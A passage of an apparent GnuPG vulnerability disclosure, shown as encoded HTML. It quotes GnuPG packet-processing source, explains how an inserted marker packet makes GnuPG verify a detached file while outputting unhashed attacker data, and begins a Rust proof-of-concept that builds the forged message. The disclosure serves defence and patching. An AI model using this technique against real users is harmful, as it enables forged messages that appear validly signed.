=3D"color:#E6EDF3"> (</span><span style=3D"color:#D2A8FF">gpg_err_code</spa=
n><span style=3D"color:#E6EDF3">(rc) </span><span style=3D"color:#FF7B72">=
=3D=3D</span><span style=3D"color:#E6EDF3"> GPG_ERR_EACCES </span><span sty=
le=3D"color:#FF7B72">&#x26;&#x26;</span><span style=3D"color:#FF7B72"> !</s=
pan><span style=3D"color:#E6EDF3">c->sigs_only) &#123;</span></span>
<span class=3D"line"><span style=3D"color:#8B949E">      /* Can't write out=
put but we hash it anyway to check the</span></span>
<span class=3D"line"><span style=3D"color:#8B949E">         signature. */</=
span></span>
<span class=3D"line"><span style=3D"color:#E6EDF3">      rc </span><span st=
yle=3D"color:#FF7B72">=3D</span><span style=3D"color:#D2A8FF"> handle_plain=
text</span><span style=3D"color:#E6EDF3">(pt, </span><span style=3D"color:#=
FF7B72">&#x26;</span><span style=3D"color:#E6EDF3">c->mfx, </span><span sty=
le=3D"color:#79C0FF">1</span><span style=3D"color:#E6EDF3">, clearsig);</sp=
an></span>
<span class=3D"line"><span style=3D"color:#E6EDF3">    &#125;</span></span>
<span class=3D"line"><span style=3D"color:#E6EDF3">  &#125;</span></span>
<span class=3D"line"></span>
<span class=3D"line"><span style=3D"color:#FF7B72">  if</span><span style=
=3D"color:#E6EDF3"> (rc)</span></span>
<span class=3D"line"><span style=3D"color:#D2A8FF">    log_error</span><spa=
n style=3D"color:#E6EDF3">(</span><span style=3D"color:#A5D6FF">"handle pla=
intext failed: </span><span style=3D"color:#FF7B72">%s&#92;n</span><span st=
yle=3D"color:#A5D6FF">"</span><span style=3D"color:#E6EDF3">, </span><span =
style=3D"color:#D2A8FF">gpg_strerror</span><span style=3D"color:#E6EDF3">(r=
c));</span></span>
<span class=3D"line"><span style=3D"color:#8B949E">  // ...</span></span>
<span class=3D"line"><span style=3D"color:#E6EDF3">&#125;</span></span></co=
de></pre><!----> <p>And in <code>handle_plaintext</code>:</p> <!----><pre c=
lass=3D"shiki github-dark-default" style=3D"background-color:#0d1117;color:=
#e6edf3" tabindex=3D"0"><code><span class=3D"line"><span style=3D"color:#FF=
7B72">int</span><span style=3D"color:#D2A8FF"> handle_plaintext</span><span=
 style=3D"color:#E6EDF3">(PKT_plaintext</span><span style=3D"color:#FF7B72"=
>*</span><span style=3D"color:#FFA657"> pt</span><span style=3D"color:#E6ED=
F3">, </span><span style=3D"color:#79C0FF">md_filter_context_t</span><span =
style=3D"color:#FF7B72">*</span><span style=3D"color:#FFA657"> mfx</span><s=
pan style=3D"color:#E6EDF3">,</span></span>
<span class=3D"line"><span style=3D"color:#FF7B72">                     int=
</span><span style=3D"color:#FFA657"> nooutput</span><span style=3D"color:#=
E6EDF3">, </span><span style=3D"color:#FF7B72">int</span><span style=3D"col=
or:#FFA657"> clearsig</span><span style=3D"color:#E6EDF3">) &#123;</span></=
span>
<span class=3D"line"><span style=3D"color:#FF7B72">  char*</span><span styl=
e=3D"color:#E6EDF3"> fname </span><span style=3D"color:#FF7B72">=3D</span><=
span style=3D"color:#79C0FF"> NULL</span><span style=3D"color:#E6EDF3">;</s=
pan></span>
<span class=3D"line"><span style=3D"color:#79C0FF">  estream_t</span><span =
style=3D"color:#E6EDF3"> fp </span><span style=3D"color:#FF7B72">=3D</span>=
<span style=3D"color:#79C0FF"> NULL</span><span style=3D"color:#E6EDF3">;</=
span></span>
<span class=3D"line"></span>
<span class=3D"line"><span style=3D"color:#FF7B72">  if</span><span style=
=3D"color:#E6EDF3"> (</span><span style=3D"color:#FF7B72">!</span><span sty=
le=3D"color:#E6EDF3">nooutput) &#123;</span></span>
<span class=3D"line"><span style=3D"color:#E6EDF3">    err </span><span sty=
le=3D"color:#FF7B72">=3D</span><span style=3D"color:#D2A8FF"> get_output_fi=
le</span><span style=3D"color:#E6EDF3">(pt->name, pt->namelen, pt->buf, </s=
pan><span style=3D"color:#FF7B72">&#x26;</span><span style=3D"color:#E6EDF3=
">fname, </span><span style=3D"color:#FF7B72">&#x26;</span><span style=3D"c=
olor:#E6EDF3">fp);</span></span>
<span class=3D"line"><span style=3D"color:#FF7B72">    if</span><span style=
=3D"color:#E6EDF3"> (err) </span><span style=3D"color:#FF7B72">goto</span><=
span style=3D"color:#E6EDF3"> leave;</span></span>
<span class=3D"line"><span style=3D"color:#E6EDF3">  &#125;</span></span>
<span class=3D"line"></span>
<span class=3D"line"><span style=3D"color:#8B949E">  // ...</span></span>
<span class=3D"line"><span style=3D"color:#FF7B72">  if</span><span style=
=3D"color:#E6EDF3"> (mfx->md) </span><span style=3D"color:#D2A8FF">gcry_md_=
write</span><span style=3D"color:#E6EDF3">(mfx->md, buffer, len);</span></s=
pan>
<span class=3D"line"><span style=3D"color:#FF7B72">  if</span><span style=
=3D"color:#E6EDF3"> (fp) &#123;</span></span>
<span class=3D"line"><span style=3D"color:#8B949E">    // ...</span></span>
<span class=3D"line"><span style=3D"color:#FF7B72">    if</span><span style=
=3D"color:#E6EDF3"> (</span><span style=3D"color:#D2A8FF">es_fwrite</span><=
span style=3D"color:#E6EDF3">(buffer, </span><span style=3D"color:#79C0FF">=
1</span><span style=3D"color:#E6EDF3">, len, fp) </span><span style=3D"colo=
r:#FF7B72">!=3D</span><span style=3D"color:#E6EDF3"> len) &#123;</span></sp=
an>
<span class=3D"line"><span style=3D"color:#8B949E">      // ...</span></spa=
n>
<span class=3D"line"><span style=3D"color:#E6EDF3">    &#125;</span></span>
<span class=3D"line"><span style=3D"color:#E6EDF3">  &#125;</span></span>
<span class=3D"line"><span style=3D"color:#8B949E">  // ...			</span></span>
<span class=3D"line"><span style=3D"color:#E6EDF3">&#125;</span></span></co=
de></pre><!----> <p>After that code is done, the newly created tree of pars=
ed packets gets processed.</p> <p>Crucially, the <code>!c->any.data</code> =
condition is used to determine whether a signature is a detached signature =
or a full signature (as described in the comment in the second check).</p> =
<!----><pre class=3D"shiki github-dark-default" style=3D"background-color:#=
0d1117;color:#e6edf3" tabindex=3D"0"><code><span class=3D"line"><span style=
=3D"color:#FF7B72">static</span><span style=3D"color:#FF7B72"> void</span><=
span style=3D"color:#D2A8FF"> release_list</span><span style=3D"color:#E6ED=
F3">(CTX </span><span style=3D"color:#FFA657">c</span><span style=3D"color:=
#E6EDF3">) &#123;</span></span>
<span class=3D"line"><span style=3D"color:#D2A8FF">  proc_tree</span><span =
style=3D"color:#E6EDF3">(c, c->list);</span></span>
<span class=3D"line"><span style=3D"color:#8B949E">  // ...</span></span>
<span class=3D"line"><span style=3D"color:#E6EDF3">&#125;</span></span>
<span class=3D"line"></span>
<span class=3D"line"><span style=3D"color:#FF7B72">static</span><span style=
=3D"color:#FF7B72"> void</span><span style=3D"color:#D2A8FF"> proc_tree</sp=
an><span style=3D"color:#E6EDF3">(CTX </span><span style=3D"color:#FFA657">=
c</span><span style=3D"color:#E6EDF3">, </span><span style=3D"color:#79C0FF=
">kbnode_t</span><span style=3D"color:#FFA657"> node</span><span style=3D"c=
olor:#E6EDF3">) &#123;</span></span>
<span class=3D"line"><span style=3D"color:#8B949E">  // ...</span></span>
<span class=3D"line"><span style=3D"color:#FF7B72">  if</span><span style=
=3D"color:#E6EDF3"> (node->pkt->pkttype </span><span style=3D"color:#FF7B72=
">=3D=3D</span><span style=3D"color:#E6EDF3"> PKT_PUBLIC_KEY</span></span>
<span class=3D"line"><span style=3D"color:#FF7B72">    ||</span><span style=
=3D"color:#E6EDF3"> node->pkt->pkttype </span><span style=3D"color:#FF7B72"=
>=3D=3D</span><span style=3D"color:#E6EDF3"> PKT_PUBLIC_SUBKEY) &#123;</spa=
n></span>
<span class=3D"line"><span style=3D"color:#D2A8FF">    merge_keys_and_selfs=
ig</span><span style=3D"color:#E6EDF3">(c->ctrl, node);</span></span>
<span class=3D"line"><span style=3D"color:#D2A8FF">    list_node</span><spa=
n style=3D"color:#E6EDF3">(c, node);</span></span>
<span class=3D"line"><span style=3D"color:#E6EDF3">  &#125; </span><span st=
yle=3D"color:#FF7B72">else</span><span style=3D"color:#FF7B72"> if</span><s=
pan style=3D"color:#E6EDF3"> (node->pkt->pkttype </span><span style=3D"colo=
r:#FF7B72">=3D=3D</span><span style=3D"color:#E6EDF3"> PKT_SECRET_KEY) &#12=
3;</span></span>
<span class=3D"line"><span style=3D"color:#D2A8FF">    merge_keys_and_selfs=
ig</span><span style=3D"color:#E6EDF3">(c->ctrl, node);</span></span>
<span class=3D"line"><span style=3D"color:#D2A8FF">    list_node</span><spa=
n style=3D"color:#E6EDF3">(c, node);</span></span>
<span class=3D"line"><span style=3D"color:#E6EDF3">  &#125; </span><span st=
yle=3D"color:#FF7B72">else</span><span style=3D"color:#FF7B72"> if</span><s=
pan style=3D"color:#E6EDF3"> (node->pkt->pkttype </span><span style=3D"colo=
r:#FF7B72">=3D=3D</span><span style=3D"color:#E6EDF3"> PKT_ONEPASS_SIG) &#1=
23;</span></span>
<span class=3D"line"><span style=3D"color:#8B949E">    /* Check all signatu=
res.  */</span></span>
<span class=3D"line"><span style=3D"color:#FF7B72">    if</span><span style=
=3D"color:#E6EDF3"> (</span><span style=3D"color:#FF7B72">!</span><span sty=
le=3D"color:#E6EDF3">c->any.data) &#123;</span></span>
<span class=3D"line"><span style=3D"color:#FF7B72">      int</span><span st=
yle=3D"color:#E6EDF3"> use_textmode </span><span style=3D"color:#FF7B72">=
=3D</span><span style=3D"color:#79C0FF"> 0</span><span style=3D"color:#E6ED=
F3">;</span></span>
<span class=3D"line"></span>
<span class=3D"line"><span style=3D"color:#D2A8FF">      free_md_filter_con=
text</span><span style=3D"color:#E6EDF3">(</span><span style=3D"color:#FF7B=
72">&#x26;</span><span style=3D"color:#E6EDF3">c->mfx);</span></span>
<span class=3D"line"><span style=3D"color:#8B949E">      /* Prepare to crea=
te all requested message digests.  */</span></span>
<span class=3D"line"><span style=3D"color:#E6EDF3">      rc </span><span st=
yle=3D"color:#FF7B72">=3D</span><span style=3D"color:#D2A8FF"> gcry_md_open=
</span><span style=3D"color:#E6EDF3">(</span><span style=3D"color:#FF7B72">=
&#x26;</span><span style=3D"color:#E6EDF3">c->mfx.md, </span><span style=3D=
"color:#79C0FF">0</span><span style=3D"color:#E6EDF3">, </span><span style=
=3D"color:#79C0FF">0</span><span style=3D"color:#E6EDF3">);</span></span>
<span class=3D"line"><span style=3D"color:#FF7B72">      if</span><span sty=
le=3D"color:#E6EDF3"> (rc) </span><span style=3D"color:#FF7B72">goto</span>=
<span style=3D"color:#E6EDF3"> hash_err;</span></span>
<span class=3D"line"></span>
<span class=3D"line"><span style=3D"color:#8B949E">      /* Fixme: why look=
ing for the signature packet and not the</span></span>
<span class=3D"line"><span style=3D"color:#8B949E">         one-pass packet=
?  */</span></span>
<span class=3D"line"><span style=3D"color:#FF7B72">      for</span><span st=
yle=3D"color:#E6EDF3"> (n1 </span><span style=3D"color:#FF7B72">=3D</span><=
span style=3D"color:#E6EDF3"> node; (n1 </span><span style=3D"color:#FF7B72=
">=3D</span><span style=3D"color:#D2A8FF"> find_next_kbnode</span><span sty=
le=3D"color:#E6EDF3">(n1, PKT_SIGNATURE));)</span></span>
<span class=3D"line"><span style=3D"color:#D2A8FF">        gcry_md_enable</=
span><span style=3D"color:#E6EDF3">(</span></span>
<span class=3D"line"><span style=3D"color:#E6EDF3">          c->mfx.md, n1-=
>pkt->pkt.signature->digest_algo);</span></span>
<span class=3D"line"></span>
<span class=3D"line"><span style=3D"color:#FF7B72">      if</span><span sty=
le=3D"color:#E6EDF3"> (n1 </span><span style=3D"color:#FF7B72">&#x26;&#x26;=
</span><span style=3D"color:#E6EDF3"> n1->pkt->pkt.onepass_sig->sig_class <=
/span><span style=3D"color:#FF7B72">=3D=3D</span><span style=3D"color:#FF7B=
72"> 0x</span><span style=3D"color:#79C0FF">01</span><span style=3D"color:#=
E6EDF3">) use_textmode </span><span style=3D"color:#FF7B72">=3D</span><span=
 style=3D"color:#79C0FF"> 1</span><span style=3D"color:#E6EDF3">;</span></s=
pan>
<span class=3D"line"></span>
<span class=3D"line"><span style=3D"color:#8B949E">      /* Ask for file an=
d hash it. */</span></span>
<span class=3D"line"><span style=3D"color:#FF7B72">      if</span><span sty=
le=3D"color:#E6EDF3"> (c->sigs_only) &#123;</span></span>
<span class=3D"line"><span style=3D"color:#FF7B72">        if</span><span s=
tyle=3D"color:#E6EDF3"> (c->signed_data.used </span><span style=3D"color:#F=
F7B72">&#x26;&#x26;</span><span style=3D"color:#E6EDF3"> c->signed_data.dat=
a_fd </span><span style=3D"color:#FF7B72">!=3D</span><span style=3D"color:#=
FF7B72"> -</span><span style=3D"color:#79C0FF">1</span><span style=3D"color=
:#E6EDF3">)</span></span>
<span class=3D"line"><span style=3D"color:#E6EDF3">          rc </span><spa=
n style=3D"color:#FF7B72">=3D</span><span style=3D"color:#D2A8FF"> hash_dat=
afile_by_fd</span><span style=3D"color:#E6EDF3">(c->mfx.md, </span><span st=
yle=3D"color:#79C0FF">NULL</span><span style=3D"color:#E6EDF3">,</span></sp=
an>
<span class=3D"line"><span style=3D"color:#E6EDF3">                        =
           c->signed_data.data_fd,</span></span>
<span class=3D"line"><span style=3D"color:#E6EDF3">                        =
           use_textmode);</span></span>
<span class=3D"line"><span style=3D"color:#FF7B72">        else</span></spa=
n>
<span class=3D"line"><span style=3D"color:#E6EDF3">          rc </span><spa=
n style=3D"color:#FF7B72">=3D</span><span style=3D"color:#D2A8FF"> hash_dat=
afiles</span><span style=3D"color:#E6EDF3">(c->mfx.md, </span><span style=
=3D"color:#79C0FF">NULL</span><span style=3D"color:#E6EDF3">,</span></span>
<span class=3D"line"><span style=3D"color:#E6EDF3">                        =
      c->signed_data.data_names,</span></span>
<span class=3D"line"><span style=3D"color:#E6EDF3">                        =
      c->sigfilename,</span></span>
<span class=3D"line"><span style=3D"color:#E6EDF3">                        =
      use_textmode);</span></span>
<span class=3D"line"><span style=3D"color:#E6EDF3">      &#125; </span><spa=
n style=3D"color:#FF7B72">else</span><span style=3D"color:#E6EDF3"> &#123;<=
/span></span>
<span class=3D"line"><span style=3D"color:#E6EDF3">        rc </span><span =
style=3D"color:#FF7B72">=3D</span><span style=3D"color:#D2A8FF"> ask_for_de=
tached_datafile</span><span style=3D"color:#E6EDF3">(c->mfx.md, </span><spa=
n style=3D"color:#79C0FF">NULL</span><span style=3D"color:#E6EDF3">,</span>=
</span>
<span class=3D"line"><span style=3D"color:#D2A8FF">                        =
               iobuf_get_real_fname</span><span style=3D"color:#E6EDF3">(c-=
>iobuf),</span></span>
<span class=3D"line"><span style=3D"color:#E6EDF3">                        =
               use_textmode);</span></span>
<span class=3D"line"><span style=3D"color:#E6EDF3">      &#125;</span></spa=
n>
<span class=3D"line"></span>
<span class=3D"line"><span style=3D"color:#E6EDF3">    hash_err: </span><sp=
an style=3D"color:#FF7B72">if</span><span style=3D"color:#E6EDF3"> (rc) &#1=
23;</span></span>
<span class=3D"line"><span style=3D"color:#D2A8FF">        log_error</span>=
<span style=3D"color:#E6EDF3">(</span><span style=3D"color:#A5D6FF">"can't =
hash datafile: </span><span style=3D"color:#FF7B72">%s&#92;n</span><span st=
yle=3D"color:#A5D6FF">"</span><span style=3D"color:#E6EDF3">, </span><span =
style=3D"color:#D2A8FF">gpg_strerror</span><span style=3D"color:#E6EDF3">(r=
c));</span></span>
<span class=3D"line"><span style=3D"color:#FF7B72">        return</span><sp=
an style=3D"color:#E6EDF3">;</span></span>
<span class=3D"line"><span style=3D"color:#E6EDF3">      &#125;</span></spa=
n>
<span class=3D"line"><span style=3D"color:#E6EDF3">    &#125; </span><span =
style=3D"color:#FF7B72">else</span><span style=3D"color:#FF7B72"> if</span>=
<span style=3D"color:#E6EDF3"> (c->signed_data.used) &#123;</span></span>
<span class=3D"line"><span style=3D"color:#D2A8FF">      log_error</span><s=
pan style=3D"color:#E6EDF3">(</span><span style=3D"color:#D2A8FF">_</span><=
span style=3D"color:#E6EDF3">(</span><span style=3D"color:#A5D6FF">"not a d=
etached signature</span><span style=3D"color:#FF7B72">&#92;n</span><span st=
yle=3D"color:#A5D6FF">"</span><span style=3D"color:#E6EDF3">));</span></spa=
n>
<span class=3D"line"><span style=3D"color:#FF7B72">      return</span><span=
 style=3D"color:#E6EDF3">;</span></span>
<span class=3D"line"><span style=3D"color:#E6EDF3">    &#125;</span></span>
<span class=3D"line"></span>
<span class=3D"line"><span style=3D"color:#FF7B72">    for</span><span styl=
e=3D"color:#E6EDF3"> (n1 </span><span style=3D"color:#FF7B72">=3D</span><sp=
an style=3D"color:#E6EDF3"> node; (n1 </span><span style=3D"color:#FF7B72">=
=3D</span><span style=3D"color:#D2A8FF"> find_next_kbnode</span><span style=
=3D"color:#E6EDF3">(n1, PKT_SIGNATURE));) </span><span style=3D"color:#D2A8=
FF">check_sig_and_print</span><span style=3D"color:#E6EDF3">(c, n1);</span>=
</span>
<span class=3D"line"><span style=3D"color:#E6EDF3">  &#125; </span><span st=
yle=3D"color:#FF7B72">else</span><span style=3D"color:#FF7B72"> if</span><s=
pan style=3D"color:#E6EDF3"> (node->pkt->pkttype </span><span style=3D"colo=
r:#FF7B72">=3D=3D</span><span style=3D"color:#E6EDF3"> PKT_GPG_CONTROL</spa=
n></span>
<span class=3D"line"><span style=3D"color:#FF7B72">    &#x26;&#x26;</span><=
span style=3D"color:#E6EDF3"> node->pkt->pkt.gpg_control->control </span><s=
pan style=3D"color:#FF7B72">=3D=3D</span><span style=3D"color:#E6EDF3"> CTR=
LPKT_CLEARSIGN_START) &#123;</span></span>
<span class=3D"line"><span style=3D"color:#8B949E">    /* Clear text signed=
 message.  */</span></span>
<span class=3D"line"><span style=3D"color:#8B949E">    // ...</span></span>
<span class=3D"line"><span style=3D"color:#E6EDF3">  &#125; </span><span st=
yle=3D"color:#FF7B72">else</span><span style=3D"color:#FF7B72"> if</span><s=
pan style=3D"color:#E6EDF3"> (node->pkt->pkttype </span><span style=3D"colo=
r:#FF7B72">=3D=3D</span><span style=3D"color:#E6EDF3"> PKT_SIGNATURE) &#123=
;</span></span>
<span class=3D"line"><span style=3D"color:#8B949E">    // ...</span></span>
<span class=3D"line"><span style=3D"color:#FF7B72">    if</span><span style=
=3D"color:#E6EDF3"> (</span><span style=3D"color:#FF7B72">!</span><span sty=
le=3D"color:#E6EDF3">c->any.data) &#123;</span></span>
<span class=3D"line"><span style=3D"color:#8B949E">      /* Detached signat=
ure */</span></span>
<span class=3D"line"><span style=3D"color:#8B949E">      // ...</span></spa=
n>
<span class=3D"line"><span style=3D"color:#E6EDF3">    &#125; </span><span =
style=3D"color:#FF7B72">else</span><span style=3D"color:#FF7B72"> if</span>=
<span style=3D"color:#E6EDF3"> (c->signed_data.used) &#123;</span></span>
<span class=3D"line"><span style=3D"color:#D2A8FF">      log_error</span><s=
pan style=3D"color:#E6EDF3">(</span><span style=3D"color:#D2A8FF">_</span><=
span style=3D"color:#E6EDF3">(</span><span style=3D"color:#A5D6FF">"not a d=
etached signature</span><span style=3D"color:#FF7B72">&#92;n</span><span st=
yle=3D"color:#A5D6FF">"</span><span style=3D"color:#E6EDF3">));</span></spa=
n>
<span class=3D"line"><span style=3D"color:#FF7B72">      return</span><span=
 style=3D"color:#E6EDF3">;</span></span>
<span class=3D"line"><span style=3D"color:#E6EDF3">    &#125;</span></span>
<span class=3D"line"><span style=3D"color:#8B949E">    // ...</span></span>
<span class=3D"line"><span style=3D"color:#E6EDF3">  &#125; </span><span st=
yle=3D"color:#FF7B72">else</span><span style=3D"color:#E6EDF3"> &#123;</spa=
n></span>
<span class=3D"line"><span style=3D"color:#D2A8FF">    dump_kbnode</span><s=
pan style=3D"color:#E6EDF3">(c->list);</span></span>
<span class=3D"line"><span style=3D"color:#D2A8FF">    log_error</span><spa=
n style=3D"color:#E6EDF3">(</span><span style=3D"color:#A5D6FF">"invalid ro=
ot packet detected in proc_tree()</span><span style=3D"color:#FF7B72">&#92;=
n</span><span style=3D"color:#A5D6FF">"</span><span style=3D"color:#E6EDF3"=
>);</span></span>
<span class=3D"line"><span style=3D"color:#D2A8FF">    dump_kbnode</span><s=
pan style=3D"color:#E6EDF3">(node);</span></span>
<span class=3D"line"><span style=3D"color:#E6EDF3">  &#125;</span></span>
<span class=3D"line"><span style=3D"color:#E6EDF3">&#125;</span></span>
<span class=3D"line"></span></code></pre><!----> <p>An attacker can constru=
ct a packet that is processed by <em>GnuPG</em> in the following way:</p> <=
ul><li><code>any->data</code> is initialized to <code>0</code></li> <li><co=
de>do_proc_packets</code> loops over the packets: <ul><li>The One-Pass Pack=
et gets processed as usual <ul><li><code>any->data</code> gets set to <code=
>0</code></li></ul></li> <li>The Literal Data Packet gets processed by <cod=
e>proc_plaintext</code>: <ul><li>It opens the message hash digest buffer <c=
ode>mfx.md</code></li> <li>It calls <code>handle_plaintext</code>: <ul><li>=
It reads the content of the literal packet</li> <li>It writes it into the <=
code>mfx.md</code> buffer</li> <li><strong>It writes the literal data packe=
t to the output file</strong></li></ul></li> <li><code>any->data</code> get=
s set to <code>1</code></li></ul></li> <li>The Signature Packet gets proces=
sed as usual <ul><li><code>any->data</code> is untouched</li></ul></li> <li=
>The Marker Packet gets processed <ul><li><strong><code>any->data</code> ge=
ts set to <code>0</code></strong></li></ul></li></ul></li> <li><code>proc_t=
ree</code> gets called <ul><li>It processes the root (first packet) as an O=
ne-Pass Sig Packet, and branches</li> <li>It observes <code>any.data</code>=
 as <code>0</code>, and branches to the detached signature code <ul><li><st=
rong>It opens the message hash digest buffer <code>mfx.md</code>, resetting=
 it</strong></li> <li>It looks for a detached datafile and writes it into t=
he <code>mfx.md</code> buffer</li></ul></li> <li><strong>The signature of o=
ur packet gets checked against <code>mfx.md</code>, which now contains the =
detached datafile!</strong></li></ul></li></ul> <p>Therefore, the output is=
 the data from <em>our literal packet</em>, while the <em>detached datafile=
</em> is hashed and verified, while the output is <em>never hashed</em>.</p=
> <h3>Detailed steps to reproduce</h3> <h4>Scenario</h4> <p>Alice wants to =
send Bob a message.
Over a trusted channel they exchanged and verified their public keys.
Over an untrusted channel, on which Mallory has an MITM role, Alice sends a=
 the message along with a detached signature.
Mallory changes the content of the detached signature.
Bob successfully verifies the authenticity of the message.
He additionally uses <code>--decrypt</code> (verifies and outputs the messa=
ge) to view the message.
Instead, of being shown Alice=E2=80=99s original message, Bob sees the cont=
ent that Mallory placed</p> <h4>Procedure</h4> <p>Alice writes and signs th=
e message and sends it to Bob.</p> <!----><pre class=3D"shiki github-dark-d=
efault" style=3D"background-color:#0d1117;color:#e6edf3" tabindex=3D"0"><co=
de><span class=3D"line"><span style=3D"color:#79C0FF">echo</span><span styl=
e=3D"color:#A5D6FF"> Plaintext</span><span style=3D"color:#FF7B72"> ></span=
><span style=3D"color:#A5D6FF"> plaintext</span></span>
<span class=3D"line"><span style=3D"color:#FFA657">gpg</span><span style=3D=
"color:#79C0FF"> --detach-sig</span><span style=3D"color:#A5D6FF"> plaintex=
t</span></span></code></pre><!----> <p>During transport Mallory manipulates=
 the message in the following way:</p> <!----><pre class=3D"shiki github-da=
rk-default" style=3D"background-color:#0d1117;color:#e6edf3" tabindex=3D"0"=
><code><span class=3D"line"><span style=3D"color:#E6EDF3">#</span><span sty=
le=3D"color:#FF7B72">!/</span><span style=3D"color:#E6EDF3">usr</span><span=
 style=3D"color:#FF7B72">/</span><span style=3D"color:#E6EDF3">bin</span><s=
pan style=3D"color:#FF7B72">/</span><span style=3D"color:#E6EDF3">env rust<=
/span><span style=3D"color:#FF7B72">-</span><span style=3D"color:#E6EDF3">s=
cript</span></span>
<span class=3D"line"></span>
<span class=3D"line"><span style=3D"color:#8B949E">//! &#96;&#96;&#96;cargo=
</span></span>
<span class=3D"line"><span style=3D"color:#8B949E">//! [dependencies]</span=
></span>
<span class=3D"line"><span style=3D"color:#8B949E">//! sequoia-openpgp =3D =
"2.0.0"</span></span>
<span class=3D"line"><span style=3D"color:#8B949E">//! simple-base64 =3D "0=
.23.2"</span></span>
<span class=3D"line"><span style=3D"color:#8B949E">//! &#96;&#96;&#96;</spa=
n></span>
<span class=3D"line"></span>
<span class=3D"line"><span style=3D"color:#FF7B72">use</span><span style=3D=
"color:#FFA657"> sequoia_openpgp</span><span style=3D"color:#FF7B72">::</sp=
an><span style=3D"color:#FFA657">packet</span><span style=3D"color:#FF7B72"=
>::</span><span style=3D"color:#E6EDF3">&#123;</span><span style=3D"color:#=
FFA657">Literal</span><span style=3D"color:#E6EDF3">, </span><span style=3D=
"color:#FFA657">Marker</span><span style=3D"color:#E6EDF3">, </span><span s=
tyle=3D"color:#FFA657">OnePassSig</span><span style=3D"color:#E6EDF3">&#125=
;;</span></span>
<span class=3D"line"><span style=3D"color:#FF7B72">use</span><span style=3D=
"color:#FFA657"> sequoia_openpgp</span><span style=3D"color:#FF7B72">::</sp=
an><span style=3D"color:#FFA657">parse</span><span style=3D"color:#FF7B72">=
::</span><span style=3D"color:#FFA657">Parse</span><span style=3D"color:#E6=
EDF3">;</span></span>
<span class=3D"line"><span style=3D"color:#FF7B72">use</span><span style=3D=
"color:#FFA657"> sequoia_openpgp</span><span style=3D"color:#FF7B72">::</sp=
an><span style=3D"color:#FFA657">serialize</span><span style=3D"color:#FF7B=
72">::</span><span style=3D"color:#FFA657">stream</span><span style=3D"colo=
r:#FF7B72">::</span><span style=3D"color:#E6EDF3">&#123;</span><span style=
=3D"color:#FFA657">Armorer</span><span style=3D"color:#E6EDF3">, </span><sp=
an style=3D"color:#FFA657">Message</span><span style=3D"color:#E6EDF3">&#12=
5;;</span></span>
<span class=3D"line"><span style=3D"color:#FF7B72">use</span><span style=3D=
"color:#FFA657"> sequoia_openpgp</span><span style=3D"color:#FF7B72">::</sp=
an><span style=3D"color:#FFA657">serialize</span><span style=3D"color:#FF7B=
72">::</span><span style=3D"color:#FFA657">Serialize</span><span style=3D"c=
olor:#E6EDF3">;</span></span>
<span class=3D"line"><span style=3D"color:#FF7B72">use</span><span style=3D=
"color:#FFA657"> sequoia_openpgp</span><span style=3D"color:#FF7B72">::</sp=
an><span style=3D"color:#FFA657">types</span><span style=3D"color:#FF7B72">=
::</span><span style=3D"color:#FFA657">DataFormat</span><span style=3D"colo=
r:#FF7B72">::</span><span style=3D"color:#FFA657">Binary</span><span style=
=3D"color:#E6EDF3">;</span></span>
<span class=3D"line"><span style=3D"color:#FF7B72">use</span><span style=3D=
"color:#FFA657"> sequoia_openpgp</span><span style=3D"color:#FF7B72">::</sp=
an><span style=3D"color:#E6EDF3">&#123;</span><span style=3D"color:#FFA657"=
>Packet</span><span style=3D"color:#E6EDF3">, </span><span style=3D"color:#=
FFA657">PacketPile</span><span style=3D"color:#E6EDF3">&#125;;</span></span>
<span class=3D"line"></span>
<span class=3D"line"><span style=3D"color:#FF7B72">fn</span><span style=3D"=
color:#D2A8FF"> multi_plain</span><span style=3D"color:#E6EDF3">(sig_path</=
span><span style=3D"color:#FF7B72">:</span><span style=3D"color:#FF7B72"> &=
#x26;</span><span style=3D"color:#FFA657">str</span><span style=3D"color:#E=
6EDF3">, rep</span><span style=3D"color:#FF7B72">:</span><span style=3D"col=
or:#FF7B72"> &#x26;</span><span style=3D"color:#FFA657">str</span><span sty=
le=3D"color:#E6EDF3">) &#123;</span></span>
<span class=3D"line"><span style=3D"color:#FF7B72">    let</span><span styl=
e=3D"color:#E6EDF3"> pile </span><span style=3D"color:#FF7B72">=3D</span><s=
pan style=3D"color:#FFA657"> PacketPile</span><span style=3D"color:#FF7B72"=
>::</span><span style=3D"color:#D2A8FF">from_file</span><span style=3D"colo=
r:#E6EDF3">(sig_path)</span><span style=3D"color:#FF7B72">.</span><span sty=
le=3D"color:#D2A8FF">unwrap</span><span style=3D"color:#E6EDF3">();</span><=
/span>
<span class=3D"line"><span style=3D"color:#FF7B72">    let</span><span styl=
e=3D"color:#E6EDF3"> sig </span><span style=3D"color:#FF7B72">=3D</span><sp=
an style=3D"color:#E6EDF3"> pile</span><span style=3D"color:#FF7B72">.</spa=
n><span style=3D"color:#D2A8FF">into_children</span><span style=3D"color:#E=
6EDF3">()</span><span style=3D"color:#FF7B72">.</span><span style=3D"color:=
#D2A8FF">filter_map</span><span style=3D"color:#E6EDF3">(</span><span style=
=3D"color:#FF7B72">|</span><span style=3D"color:#E6EDF3">x</span><span styl=
e=3D"color:#FF7B72">|</span><span style=3D"color:#FF7B72"> match</span><spa=
n style=3D"color:#E6EDF3"> x &#123;</span></span>
<span class=3D"line"><span style=3D"color:#FFA657">        Packet</span><sp=
an style=3D"color:#FF7B72">::</span><span style=3D"color:#D2A8FF">Signature=
</span><span style=3D"color:#E6EDF3">(s) </span><span style=3D"color:#FF7B7=
2">=3D></span><span style=3D"color:#FFA657"> Some</span><span style=3D"colo=
r:#E6EDF3">(s), _ </span><span style=3D"color:#FF7B72">=3D></span><span sty=
le=3D"color:#FFA657"> None</span></span>
<span class=3D"line"><span style=3D"color:#E6EDF3">    &#125;)</span><span =
style=3D"color:#FF7B72">.</span><span style=3D"color:#D2A8FF">next</span><s=
pan style=3D"color:#E6EDF3">()</span><span style=3D"color:#FF7B72">.</span>=
<span style=3D"color:#D2A8FF">expect</span><span style=3D"color:#E6EDF3">(<=
/span><span style=3D"color:#A5D6FF">"Needs a signature packet"</span><span =
style=3D"color:#E6EDF3">);</span></span>
<span class=3D"line"><span style=3D"color:#FF7B72">    let</span><span styl=
e=3D"color:#E6EDF3"> ops </span><span style=3D"color:#FF7B72">=3D</span><sp=
an style=3D"color:#FFA657"> OnePassSig</span><span style=3D"color:#FF7B72">=
::</span><span style=3D"color:#D2A8FF">try_from</span><span style=3D"color:=
#E6EDF3">(</span><span style=3D"color:#FF7B72">&#x26;</span><span style=3D"=
